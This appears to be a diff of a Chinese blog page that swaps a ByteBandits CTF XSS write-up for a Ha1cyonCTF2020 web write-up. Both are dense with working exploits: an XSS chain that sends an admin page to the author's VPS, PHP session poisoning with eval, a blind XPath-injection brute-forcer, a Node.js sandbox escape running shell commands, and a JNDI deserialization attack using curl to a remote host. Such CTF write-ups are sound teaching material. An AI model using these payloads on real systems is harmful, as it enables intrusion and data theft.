@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ByteBandits CTF 2020部分writeup-notesapp, M0on&#39;s Blog">
-    <meta name="description" content="Byte-Bandits-CTF2020 部分writeup-notesapp">
+    <meta name="keywords" content="Ha1cyonCTF2020-部分writeup.md, M0on&#39;s Blog">
+    <meta name="description" content="Ha1cyonCTF2020-部分writeup">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ByteBandits CTF 2020部分writeup-notesapp | M0on&#39;s Blog</title>
+    <title>Ha1cyonCTF2020-部分writeup.md | M0on&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -219,12 +219,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ByteBandits CTF 2020部分writeup-notesapp</h1>
+                    <h1 class="description center-align post-title">Ha1cyonCTF2020-部分writeup.md</h1>
                 </div>
             </div>
         </div>
@@ -349,10 +349,6 @@
                                 <span class="chip bg-color">writeup</span>
                             </a>
                         
-                            <a href="/tags/xss/">
-                                <span class="chip bg-color">xss</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -374,7 +370,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-12
+                    2020-04-21
                 </div>
                 
 
@@ -390,7 +386,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    10 分
                 </div>
                 
 
@@ -406,321 +402,335 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃了不会前端的大亏，下午的时候一度要做出来了，思路完全对了</p>
-<p>编写利用过程失败了，最后就差<code>js</code>获取<code>iframe</code>内容那么一点卡住了很久，最后改了几个字符就成功了</p>
-<p>网上一搜一页基本上都是复制粘帖的，果然不能总靠临时学习，吐了</p>
-<p>这次比赛过后下定决心好好学一下<code>js</code></p>
-<h2 id="源代码和大概内容"><a href="#源代码和大概内容" class="headerlink" title="源代码和大概内容"></a>源代码和大概内容</h2><p><strong>main.py</strong></p>
-<pre><code>import os
-from flask import Flask, render_template, request, flash, redirect
-from flask_sqlalchemy import SQLAlchemy
-from flask_login import LoginManager
-from flask_login import login_required, logout_user, current_user, login_user
-import markdown2
-import requests
+                <h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><pre><code>import requests
 
-from .models import User
-from . import db, create_app, login_manager
-from .visit_link import q, visit_url
+session = requests.session()
 
-app = create_app()
-
-# configure login_manager {{{1 #
-@login_manager.user_loader
-def load_user(user_id):
-    """Check if user is logged-in on every page load."""
-    if user_id is not None:
-        return User.query.get(user_id)
-    return None
-
-
-@login_manager.unauthorized_handler
-def unauthorized():
-    """Redirect unauthorized users to Login page."""
-    flash('You must be logged in to view that page.')
-    return redirect("/login")
-# 1}}} #
-
-# configure routes {{{1 #
-@app.route("/")
-def index():
-    if current_user.is_authenticated:
-        return redirect("/profile")
-    return render_template("index.html")
-
-@app.route("/register", methods = ["GET", "POST"])
-def register():
-    if current_user.is_authenticated:
-        return redirect("/profile")
-
-    if request.method == 'POST':
-        # register user
-        id = request.form.get('username')
-        password = request.form.get('password')
-        existing_user = User.query.filter_by(id = id).first()  # Check if user exists
-        if existing_user is None:
-            user = User(id = id)
-            user.set_password(password)
-            user.notes = ""
-            db.session.add(user)
-            db.session.commit()  # Create new user
-            login_user(user)  # Log in as newly created user
-            return redirect("/profile")
-        flash('A user already exists with that name already exists.')
-        return redirect("/register")
-    return render_template("register.html")
-
-@app.route("/login", methods = ["GET", "POST"])
-def login():
-    if current_user.is_authenticated:
-        return redirect("/profile")
-
-    if request.args.get("username"):
-        # register user
-        id = request.args.get('username')
-        password = request.args.get('password')
-        user = User.query.filter_by(id = id).first()
-        if user and user.check_password(password = password):
-            login_user(user)
-            return redirect("/profile")
-
-        flash('Incorrect creds')
-        return redirect("/login")
-    return render_template("login.html")
-
-@app.route("/visit_link", methods=["GET", "POST"])
-def visit_link():
-    if request.method == "POST":
-        url = request.form.get("url")
-        token = request.form.get("g-recaptcha-response")
-        r = requests.post("https://www.google.com/recaptcha/api/siteverify", data = {
-            'secret': os.environ.get('RECAPTCHA_SECRET'),
-            'response': token
-        })
-        if r.json()['success']:
-            job = q.enqueue(visit_url, url, result_ttl = 600)
-            flash("Our admin will visit the url soon.")
-            return render_template("visit_link.html", job_id = job.id)
-        else:
-            flash("Recaptcha verification failed")
-
-    return render_template("visit_link.html")
-
-@app.route("/status")
-def status():
-    job_id = request.args.get('job_id')
-    job = q.fetch_job(job_id)
-    status = job.get_status()
-    return render_template("status.html", status = status)
-
-
-@app.route("/profile")
-@login_required
-def profile():
-    return render_template("profile.html", current_user = current_user)
-
-@app.route("/update_notes", methods=["POST"])
-@login_required
-def update_notes():
-    # markdown support!!
-    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)
-    db.session.commit()
-    return redirect("/profile")
-
-
-@app.route("/logout")
-@login_required
-def logout():
-    logout_user()
-    return redirect("/")
-# 1}}} #
-</code></pre><p>是一个<code>xss</code>挑战，提交<code>url</code>可以让<code>admin</code>去访问</p>
-<p>而 <code>visit_link.py</code>的部分内容是这样</p>
-<pre><code>async def main(url):
-    browser = await launch(headless=True,
-                           executablePath="/usr/bin/chromium-browser",
-                           args=['--no-sandbox', '--disable-gpu'])
-    page = await browser.newPage()
-    await page.goto("https://notes.web.byteband.it/login")
-    await page.type("input[name='username']", "admin")
-    await page.type("input[name='password']", os.environ.get("ADMIN_PASS"))
-    await asyncio.wait([
-        page.click('button'),
-        page.waitForNavigation(),
-    ])
-    await page.goto(url)
-    await browser.close()
-
-
-def visit_url(url):
-    asyncio.get_event_loop().run_until_complete(main(url))</code></pre><p>打开<code>chrome</code>浏览器然后登录<code>admin</code>后访问提交的页面</p>
-<p>然后看到 <code>main.py</code></p>
-<pre><code>@app.route("/update_notes", methods=["POST"])
-@login_required
-def update_notes():
-    # markdown support!!
-    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)
-    db.session.commit()
-    return redirect("/profile")
-</code></pre><p>授权登录后可以编辑<code>notes</code>,使用<code>markdown2</code></p>
-<p>看到<code>github</code>上的<code>issues</code></p>
-<p><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a></p>
-<p>可以绕过造成 <code>xss</code></p>
-<pre><code>&gt;&gt;&gt; import markdown2
-&gt;&gt;&gt; markdown2.markdown('&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;', safe_mode=True)
-'&lt;p&gt;&lt;http://g&lt;!s://q?&lt;!-&amp;lt;&lt;a href="http://g"&gt;&lt;script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&amp;lt;&lt;a href="http://g"&gt;a\\*/&lt;/script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;/p&gt;\n'
-&gt;&gt;&gt; </code></pre><p>所以这是个 <code>authenticated XSS</code>，需要登录才可以利用</p>
-<p>在<code>login</code>内容</p>
-<pre><code>@app.route("/login", methods = ["GET", "POST"])
-def login():
-    if current_user.is_authenticated:
-        return redirect("/profile")
-。。。。
-        id = request.args.get('username')
-        password = request.args.get('password')
-</code></pre><p>可以看到用的是 <code>request.args.get</code></p>
-<p>也就是可以使用 <code>GET</code>来登录，</p>
-<p>而<code>flag</code>在<code>admin_user.notes = os.environ.get("FLAG")</code></p>
-<p>也就是<code>admin</code>页面的<code>notes</code>就是<code>flag</code>了</p>
-<p>所以只要利用<code>xss</code>获取那个页面内容就可以了</p>
-<p>至于<code>盗取cookie</code>的话，因为<code>cookie</code>使用了 <code>httponly</code></p>
-<p>无法通过<code>js</code>来访问，加上这样的利用条件应该无法盗用了</p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如果已经登录了，浏览器拥有那个<code>cookie</code>，然后有一个<code>iframe</code>，那么<code>iframe</code>可以获取那个<code>cookie</code></p>
-<p><a href="https://www.chromium.org/updates/same-site" target="_blank" rel="noopener">chromium same-site update</a></p>
-<p>所以变得明显起来了</p>
-<p>构造一个页面，嵌入一个<code>iframe</code>是admin的<code>profile</code>内容，包含了<code>flag</code></p>
-<p>然后加载完这个<code>iframe</code>后再构造<code>iframe</code>退出登录</p>
-<p>然后构造<code>iframe</code>登录到自己的帐号，里面有<code>xss</code></p>
-<p>有一点是因为自己构造的页面和题目页面是跨域的，在自己页面无法访问那个<code>admin profile</code></p>
-<p>所以<code>xss</code>就有用场了，<code>xss</code>页面和<code>admin profile</code>的<code>iframe</code>是同源的,</p>
-<p>那么<code>iframe</code>之间获取内容</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一个注意的点-输出-等待-输出的方式"><a href="#一个注意的点-输出-等待-输出的方式" class="headerlink" title="一个注意的点 输出-等待-输出的方式"></a>一个注意的点 输出-等待-输出的方式</h3><p>因为题目打开浏览器浏览打开访问页面后立刻关闭</p>
-<pre><code>    await page.goto(url)
-    await browser.close()</code></pre><p>在短时间内，可能无法执行完成<code>js</code>脚本</p>
-<p>所以缓冲区输出然后<code>sleep(10)</code> 停几秒，让浏览器没那么快加载完资源</p>
-<p>就可以执行<code>js</code>脚本了</p>
-<pre><code>&lt;?php
-
-echo 123333;
-ob_flush();
-flush();
-
-?&gt;
-&lt;?php
-sleep(10);
-?&gt;</code></pre><p>这样</p>
-<p>在我的 <code>vps</code>上面写两个页面</p>
-<p>一个<code>cli.php</code> ,一个<code>10.php</code></p>
-<p><code>cli.php</code>是<code>update_notes</code> 更改我的<code>xss</code>内容</p>
-<p>而 <code>10.php</code> 就是交给admin去访问的</p>
-<p>一些无用的内容多了一点，懒得删除了，<code>cli.php</code>掉入坑里了，烦</p>
-<h3 id="10-php"><a href="#10-php" class="headerlink" title="10.php"></a>10.php</h3><pre><code>&lt;?php
-header('access-control-allow-origin:*');?&gt;
-
-&lt;html&gt;
-&lt;/html&gt;
-
-
-&lt;script&gt;
-    i=document.createElement("iframe");
-    i.src="https://notes.web.byteband.it/profile";
-    i.id="pwn";
-    i.name="pwn";
-    var state = 0;
-    document.body.appendChild(i);
+burp0_url = "http://ha1cyon-ctf.fun:30135/msg.php"
+burp0_cookies = {"session": "acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I", "PHPSESSID": "4feut4nk0o5o37jjsg8173opk3"}
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://ha1cyon-ctf.fun:30135/index.bak.php?action=message.php", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
+burp0_data = {"msg": "&lt;?PhP \n#"}
+session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
 
 
 
-    i.onload=function () {
-        j=document.createElement("iframe");
-        j.src="https://notes.web.byteband.it/logout";
-        j.id="pwn2";
-        document.body.appendChild(j);
+
+burp0_data = {"msg": "\neval($_GET[_]);#"}
+session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
 
 
-        j.onload=function () {
-            k=document.createElement("iframe");
-            k.src="https://notes.web.byteband.it/login?username=mo0n&amp;password=mo0n";
-            k.id="pwn3";
-            document.body.appendChild(k);
 
-            k.onload=function () {
-                l=document.createElement("iframe");
-                l.src="http://47.92.94.199/cli.php";
-                l.id="pwn4";
-                document.body.appendChild(l);
+burp0_data = {"msg": "\n ?&gt;"}
+session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
 
-                l.onload=function () {
-                    m=document.createElement("iframe");
-                    m.src="https://notes.web.byteband.it/profile";
-                    m.id="pwn5";
-                    document.body.appendChild(m);
-                    console.log(i)
 
-                }
+burp0_url = "http://ha1cyon-ctf.fun:30135/index.bak.php?action=/tmp/sess_4feut4nk0o5o37jjsg8173opk3&amp;_=print_r(scandir('/'));print_r(file_get_contents('/FIag_!S_it'));"
+r=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+print(r.text)
+</code></pre><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><pre><code>import requests
+import re
 
-            }
-        }
+url='http://ha1cyon-ctf.fun:30163/'
+sess=requests.session()
+def token():
+    req=sess.get(url)
+    tok=re.findall('&lt;input type="hidden" id="token" value="(.*)" /&gt;',req.text)
+    return tok[0]
+
+def login(username,password):
+    data='''
+&lt;username&gt;{}&lt;/username&gt;&lt;password&gt;{}&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;
+'''.format(username,password,token())
+
+    req=sess.post(url+'login.php',data=data,headers = {'Content-Type': 'application/xml'})
+    print(req.text,req.status_code)
+    return req
+
+
+# root
+payload="' or  substring(name(/*[position()=1]),{},1)='{}'  or '1' = '1"
+ro='root'
+
+payload="' or substring(name(/root/*[position()=1]),{},1)='{}'  or '1' = '1"
+ro='accounts'
+
+payload="' or substring(name(/root/accounts/*[position()=1]),{},1)='{}'  or '1' = '1"
+ro='user'
+
+payload="' or substring(name(/root/accounts/user/*[position()=2]),{},1)='{}'  or '1' = '1"
+# id username password
+ro=''
+
+
+payload="1' or substring(/root/accounts/user[id=2]/username,{},1)='{}' or '1'='1"
+# guest adm1n
+ro=''
+
+payload="1' or substring(/root/accounts/user[id=2]/password,{},1)='{}' or '1'='1"
+#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123
+ro=''
+
+import string
+for i in range(1,100):
+    for j in string.digits+string.ascii_letters+'*':
+        if j=='*':
+            print('***************false')
+            break
+        tmp=payload.format(i,j)
+
+        req=login(tmp,'ad')
+        if '非法操作' in req.text:
+            ro+=j
+            print(ro)
+            break
+
+</code></pre><p><code>/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag</code></p>
+<p>flag{95f4aaf6-ae61-47a6-affa-6d2811efbe0e}</p>
+<h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>代码</p>
+<pre><code>const express = require('express');
+const bodyParser = require('body-parser');
+const cookieSession = require('cookie-session');
+
+const fs = require('fs');
+const crypto = require('crypto');
+
+const keys = require('./key.js').keys;
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
+    return null;
+  }
+  return eval(str);
+} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
+
+const template = fs.readFileSync('./index.html').toString();
+function render(results) {
+  return template.replace('{{results}}', results.join('&lt;br/&gt;'));
+}
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+app.use(cookieSession({
+  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
+  keys
+}));
+
+Object.freeze(Object);
+Object.freeze(Math);
+
+app.post('/', function (req, res) {
+  let result = '';
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
+      } catch (e) {
+        console.log(e);
+        result = 'Wrong Wrong Wrong!!!';
+      }
+      results.unshift(`${req.body.e}=${result}`);
     }
+  } else {
+    results.unshift('Not verified!');
+  }
+  if (results.length &gt; 13) {
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});
 
-&lt;/script&gt;
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get('/source', function (req, res) {
+  res.set('Content-Type', 'text/javascript;charset=utf-8');
+  res.send(fs.readFileSync('./index.js'));
+});
 
-&lt;?php
+app.get('/', function (req, res) {
+  res.set('Content-Type', 'text/html;charset=utf-8');
+  req.session.admin = req.session.admin || 0;
+  res.send(render(req.session.results = req.session.results || []))
+});
 
-echo 123333;
-ob_flush();
-flush();
+app.listen(80, '0.0.0.0', () =&gt; {
+  console.log('Start listening')
+});</code></pre><pre><code>import re
+encode = lambda code: list(map(ord,code))
+decode = lambda code: "".join(map(chr,code))
+a=f"""
+(m0=&gt;(
+        m0=m0.constructor,
+        m0.x=m0.constructor(
+            m0.fromCharCode({encode("return process.mainModule.require('child_process').execSync('cat /flag')")})
+        )()
+    ))(Math+1)
+"""
 
-?&gt;
-&lt;?php
-sleep(10);
-?&gt;
-</code></pre><h3 id="cli-php"><a href="#cli-php" class="headerlink" title="cli.php"></a>cli.php</h3><p>这个的<code>js</code>内容就是卡住的地方，如果会<code>javascript</code>的话早就做出来了，吐了</p>
-<p>搜索网上内容</p>
-<p>给出的<code>兄弟iframe通信</code>得到的是<code>window.parent.document.getElementById("pwn")</code></p>
-<p>这样的，但是这个是不行的，</p>
-<p>在本地测试是无法获取这个<code>admin 的iframe</code>，得到是<code>null</code></p>
-<p>一度怀疑</p>
-<h4 id="可行的一个是"><a href="#可行的一个是" class="headerlink" title="可行的一个是"></a>可行的一个是</h4><pre><code>
-top.pwn.document.body.innerHTML
 
-这个pwn是 i.name="pwn"</code></pre><h4 id="一个注意的点"><a href="#一个注意的点" class="headerlink" title="一个注意的点"></a>一个注意的点</h4><p>随后因为获取<code>html</code>内容带有<code>&lt;</code> 这些，<code>chromium</code>浏览器禁止跳转</p>
-<p>所以只要把它们变成<code>base64</code>就可以了</p>
+
+a=re.sub(r"[\s\[\]]", "", a).replace("m0","Math")
+
+print(a)</code></pre><pre><code>POST / HTTP/1.1
+Host: ha1cyon-ctf.fun:30300
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ha1cyon-ctf.fun:30300/
+Content-Type: application/json
+Content-Length: 402
+Connection: close
+Cookie: session=acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I; PHPSESSID=4feut4nk0o5o37jjsg8173opk3; PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=Af7dna727rpLpx--lZVqoWD5BKU
+Upgrade-Insecure-Requests: 1
+
+{"e":"(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)","first":{"length":"1"},"second":{"length":"1"}}</code></pre><p>flag:</p>
+<p>flag{8d82d5d6-741e-432a-be35-e43c23180b1a}</p>
+<h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><pre><code>&lt;?php
+class HelloPhp
+{
+    public $a;
+    public $b;
+
+
+}
+$a=new HelloPhp();
+$a-&gt;b='call_user_func';
+$a-&gt;a='phpinfo';
+echo urlencode(serialize($a));
+
+?&gt;</code></pre><p><code>http://ha1cyon-ctf.fun:30089/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A1%3A%22b%22%3Bs%3A14%3A%22call_user_func%22%3B%7D</code></p>
+<p>FLAG</p>
+<p>flag{7b0e7129-48fa-44b7-a8d8-8e1ed7d4a21e} </p>
+<h2 id="ezshiro"><a href="#ezshiro" class="headerlink" title="ezshiro"></a>ezshiro</h2><p>看到访问 <code>/json</code> 就跳到<code>/login</code>，</p>
+<p>是一个比较新的<code>shiro</code>漏洞<code>CVE-2020-1957</code></p>
+<p>可以通过<code>/;/json</code>的方式绕过直接访问</p>
+<p><code>GET</code>访问是显示<code>Request method not support</code></p>
+<p><code>POST a=1</code>访问，</p>
+<p>看到<code>Unrecognized token  was expecting (&amp;#39;true&amp;#39;, &amp;#39;false&amp;#39; or &amp;#39;null&amp;#39;)</code></p>
+<p>所以直接POST true，看到<code>jackson interface</code>， 所以是<code>jackson</code>反序列化</p>
+<p>看一下<code>pom.xml</code>有什么</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;project xmlns="http://maven.apache.org/POM/4.0.0"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
+  &lt;parent&gt;
+    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+    &lt;version&gt;1.5.22.RELEASE&lt;/version&gt;
+    &lt;relativePath/&gt;
+  &lt;/parent&gt;
+
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+  &lt;artifactId&gt;shiro-test&lt;/artifactId&gt;
+  &lt;build&gt;
+    &lt;plugins&gt;
+      &lt;plugin&gt;
+        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
+        &lt;configuration&gt;
+          &lt;fork&gt;true&lt;/fork&gt;
+          &lt;mainClass&gt;com.lfy.ctf.Application&lt;/mainClass&gt;
+        &lt;/configuration&gt;
+        &lt;executions&gt;
+          &lt;execution&gt;
+            &lt;goals&gt;
+              &lt;goal&gt;repackage&lt;/goal&gt;
+            &lt;/goals&gt;
+          &lt;/execution&gt;
+        &lt;/executions&gt;
+      &lt;/plugin&gt;
+    &lt;/plugins&gt;
+  &lt;/build&gt;
+
+  &lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
+    &lt;/dependency&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;
+      &lt;version&gt;1.5.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;
+      &lt;version&gt;1.5.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
+      &lt;artifactId&gt;logback-core&lt;/artifactId&gt;
+      &lt;version&gt;1.2.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+      &lt;version&gt;3.2.1&lt;/version&gt;
+    &lt;/dependency&gt;
+  &lt;/dependencies&gt;
+
+&lt;/project&gt;</code></pre><p>有<code>ch.qos.logback</code>和<code>commons-collections</code>，</p>
+<p>然后看一下<code>jackson</code>有什么漏洞，根据<code>pom.xml</code>来看，直接筛选，看到有一个<code>logback</code>的</p>
+<p><strong>CVE-2019-14439</strong>可以 </p>
+<p>利用是</p>
+<p><code>["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://localhost:43658/Calc"}]</code></p>
+<p>那么是JNDI注入</p>
+<p>然后题目是高版本的JDK，&gt; 8u191,</p>
+<p><code>paper</code>上有绕过高版本的JDK限制进行JNDI注入</p>
+<p><a href="https://paper.seebug.org/942/#ldapgadget" target="_blank" rel="noopener">https://paper.seebug.org/942/#ldapgadget</a></p>
+<p>结合<code>pom.xml</code>的<code>commons-collections</code>,</p>
+<p>就是利用LDAP返回序列化数据，触发本地Gadget，就是用Common Collections的了</p>
+<p>本来想用这个的文章的代码，<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java" target="_blank" rel="noopener">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java</a></p>
+<p>没实践过高版本的，只试过低版本的,不过随便翻翻其他的看到了可以更简单的</p>
+<p><code>ysomap</code>这个工具，在本地直接内网穿透</p>
+<pre><code>java -jar ysomap-cli-0.0.1-SNAPSHOT-all.jar
+use exploit LDAPLocalChainListener
+use payload  CommonsCollections8
+use bullet TransformerBullet
+set lport 5555
+set version 3
+set args 'curl xx.xx.xx.xxx/try/shell.php?a=test'</code></pre><p><img src="../../../../../../../images/ha1cyon/ysomap.png" alt=""></p>
+<p>vps shell.php 内容是</p>
 <pre><code>&lt;?php
+$a=$_GET['a'];
+file_put_contents('content',$a);
+</code></pre><p>然后json发送</p>
+<pre><code>["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://mu27062382.zicp.vip:18330/hhhhhh"}]</code></pre><p><img src="../../../../../../../images/ha1cyon/burp2.png" alt=""></p>
+<p>虽然是报错返回500,但是其实是执行了的，在vps上可以看到效果</p>
+<p><img src="../../../../../../../images/ha1cyon/vps.png" alt=""></p>
+<p>成功执行命令，RCE</p>
+<p>flag</p>
+<p>flag{ebcfc7fa-d9e7-4db1-9685-42684bc1aa76}</p>
+<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><pre><code>import requests
+import hashpumpy
+import urllib
 
-file_put_contents('flagggggggggggggggggg','yes');
-echo 123;
 
 
+url='http://ha1cyon-ctf.fun:30004/flflflflag.php?file=/tmp/sess_hass13s37'
 
-$js='try{var x = window.parent.document.getElementById("pwn");console.log(x);var right = (x.contentWindow || x.contentDocument);if(right.document){right = right.document;window.location="http://47.92.94.199/flag.php?good="+right;}}catch{console.log(123333);}';
+for i in range(40):
+    a,b=hashpumpy.hashpump('a3dabbc779f2fbf8b6f56113ca78a7f9','123444','1',i)
 
-$js='try{var x= window.parent.document.getElementById("pwn5");console.log(12);}catch(err){console.log("false")}';
+    req=requests.get(url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))
+    if 'username/password error' not in req.text:
+        print(req.text,url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))
 
-$js='x=top.pwn.document.body.innerHTML;console.log(x);window.location="http://47.92.94.199/flag.php?good="+btoa(x);';
 
-$content="&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;{$js}/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;";
-$url='https://notes.web.byteband.it/update_notes';
-echo "&lt;form style='display:none;' id='form1' name='form1' method='post' action='{$url}'&gt;
-&lt;input name='notes' type='text' value='{$content}' /&gt;
-&lt;/form&gt;
-&lt;script type='text/javascript'&gt;function load_submit(){document.form1.submit()}load_submit();&lt;/script&gt;";
-$a=1;
-ob_flush();
-flush();
-?&gt;
-
-&lt;?php
-sleep(60);
-?&gt;
-
-</code></pre><p><code>vps</code>接收数据，</p>
-<p>然后只要把空格转换成<code>+</code> 号就可以了</p>
-<p>base64解码</p>
